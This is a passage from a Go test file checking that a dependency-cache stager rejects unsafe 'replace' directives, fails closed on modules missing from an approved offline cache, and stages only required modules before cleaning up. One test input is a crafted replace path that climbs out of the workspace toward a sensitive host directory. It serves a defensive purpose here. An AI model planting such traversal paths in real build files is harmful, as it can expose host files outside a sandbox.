			"go.mod": "module testapp\n\ngo 1.21\n\nreplace github.com/pkg => ../../sensitive/host/path\nrequire github.com/pkg v1.0.0\n",
			"go.sum": "github.com/pkg v1.0.0 h1:1234567890=\n",
			"main.go": `package main; func main() {}`,
		})

		_, _, err := prepareMinimalDependencyCache(wsDir)
		if err == nil {
			t.Fatalf("expected prepareMinimalDependencyCache to reject unsafe replace directive")
		}
		if !strings.Contains(err.Error(), "security violation") || !strings.Contains(err.Error(), "unsafe replace") {
			t.Fatalf("expected unsafe replace security violation, got: %v", err)
		}
	})

	t.Run("MissingModuleInApprovedCacheFailsClosedWithoutDownload", func(t *testing.T) {
		fakeApprovedCache := t.TempDir()
		t.Setenv("APPROVED_DEPENDENCY_CACHE", fakeApprovedCache)

		wsDir := createTestWorkspace(t, map[string]string{
			"go.mod": "module testapp\n\ngo 1.21\n\nrequire github.com/untrusted/notincache v1.0.0\n",
			"go.sum": "github.com/untrusted/notincache v1.0.0 h1:dummychecksum=\n",
			"main.go": `package main; func main() {}`,
		})

		_, _, err := prepareMinimalDependencyCache(wsDir)
		if err == nil {
			t.Fatalf("expected missing module to fail closed, but got nil")
		}
		if !errors.Is(err, ErrDynamicVerificationUnavailable) {
			t.Fatalf("expected ErrDynamicVerificationUnavailable, got: %v", err)
		}
		if !strings.Contains(err.Error(), "missing from approved offline cache") {
			t.Fatalf("expected missing from approved offline cache error, got: %v", err)
		}
	})

	t.Run("StandardLibraryWorkspaceRequiresZeroCacheMounts", func(t *testing.T) {
		wsDir := createTestWorkspace(t, map[string]string{
			"go.mod":  "module testapp\n\ngo 1.21\n",
			"main.go": `package main; func main() {}`,
		})

		cacheDir, cleanup, err := prepareMinimalDependencyCache(wsDir)
		if err != nil {
			t.Fatalf("unexpected error for stdlib workspace: %v", err)
		}
		if cacheDir != "" {
			t.Fatalf("expected empty cacheDir for standard library workspace, got: %s", cacheDir)
		}
		if cleanup != nil {
			cleanup()
		}
	})

	t.Run("MinimalCacheStagesOnlyRequiredModuleAndCleansUp", func(t *testing.T) {
		// Create a mock approved cache containing two modules: reqModule and secretModule
		mockApprovedCache := t.TempDir()
		t.Setenv("APPROVED_DEPENDENCY_CACHE", mockApprovedCache)

		reqModDir := filepath.Join(mockApprovedCache, "github.com", "approved", "pkg@v1.0.0")
		_ = os.MkdirAll(reqModDir, 0755)
		_ = os.WriteFile(filepath.Join(reqModDir, "pkg.go"), []byte("package pkg\n"), 0644)

		secretModDir := filepath.Join(mockApprovedCache, "corp.internal", "secret@v2.0.0")
		_ = os.MkdirAll(secretModDir, 0755)
		_ = os.WriteFile(filepath.Join(secretModDir, "secret.go"), []byte("package secret\n"), 0644)

		wsDir := createTestWorkspace(t, map[string]string{
			"go.mod": "module testapp\n\ngo 1.21\n\nrequire github.com/approved/pkg v1.0.0\n",
			"go.sum": "github.com/approved/pkg v1.0.0 h1:approvedchecksum=\n",
			"main.go": `package main; func main() {}`,
		})

		cacheDir, cleanup, err := prepareMinimalDependencyCache(wsDir)
		if err != nil {
			t.Fatalf("unexpected error staging minimal cache: %v", err)
		}
		if cacheDir == "" {
			t.Fatalf("expected non-empty cacheDir")
		}

		// Verify that required module IS present in the isolated cache
		stagedReqFile := filepath.Join(cacheDir, "github.com", "approved", "pkg@v1.0.0", "pkg.go")
		if _, statErr := os.Stat(stagedReqFile); statErr != nil {
			t.Fatalf("expected required module to be staged at %s: %v", stagedReqFile, statErr)
		}

		// Verify that secretModule is NEVER present in the isolated cache
		stagedSecretFile := filepath.Join(cacheDir, "corp.internal", "secret@v2.0.0", "secret.go")
		if _, statErr := os.Stat(stagedSecretFile); statErr == nil {
			t.Fatalf("SECURITY LEAK: unrequested secret module was exposed in minimal cache: %s", stagedSecretFile)
		}

		// Verify cleanup deletes the disposable minimal cache
		cleanup()
		if _, statErr := os.Stat(cacheDir); !os.IsNotExist(statErr) {
			t.Fatalf("expected disposable minimal cache %s to be deleted after cleanup, got err=%v", cacheDir, statErr)
		}
	})
}
